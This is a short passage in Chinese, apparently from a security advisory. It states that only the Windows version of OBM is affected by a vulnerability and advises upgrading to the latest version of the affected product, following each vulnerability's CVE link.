只有 Windows 版本的 OBM 受到这个漏洞的影响。

**修复 / 解决方案**

        请参考每个漏洞中的 CVE 链接，并升级到受影响产品的最新版本。